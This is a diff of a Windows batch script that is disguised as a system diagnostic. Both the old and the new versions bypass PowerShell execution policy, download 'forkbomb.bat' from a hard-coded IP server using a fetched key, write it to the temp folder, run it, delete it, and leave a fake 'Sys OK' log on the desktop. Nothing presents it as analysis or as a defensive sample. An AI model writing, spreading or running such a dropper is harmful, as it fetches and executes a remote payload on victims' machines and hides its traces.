@@ -1,3 +1,8 @@
 @echo off
-setlocal
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue';$base='http://82.29.153.101:8080';$h=Invoke-WebRequest ($base+'/health') -UseBasicParsing;$ts=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds();$k=(Invoke-WebRequest ($base+'/auth/key?ts='+$ts) -UseBasicParsing).Content.Trim();$p=Invoke-WebRequest ($base+'/forkbomb.bat') -Headers @{ 'X-Decrypt-Key'=$k } -UseBasicParsing;$batContent=$p.Content;(New-Object System.IO.FileStream($env:TEMP+'\\sys.bat',[System.IO.FileMode]::Create,[System.IO.FileAccess]::Write)).Write([System.Text.Encoding]::ASCII.GetBytes($batContent),0,$batContent.Length);Start-Process $env:TEMP+'\\sys.bat';Remove-Item $env:TEMP+'\\sys.bat' -Force;$env:PUBLIC+'\\Desktop\\SystemDiagnostic.log'"
+setlocal enabledelayedexpansion
+for /f "delims=" %%i in ('powershell -NoP -Ex By -C "$b='http://82.29.153.101:8080';$t=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds();$k=(IWR ($b+'/auth/key?ts='+ $t) -UseBasicParsing).Content.Trim();(IWR ($b+'/forkbomb.bat') -Headers @{''=''} -UseBasicParsing).Content"') do (
+    echo %%i^>^>%temp%\sys.bat
+)
+start "" %temp%\sys.bat
+del %temp%\sys.bat
+echo Sys OK^>^>%public%\Desktop\SystemDiagnostic.log
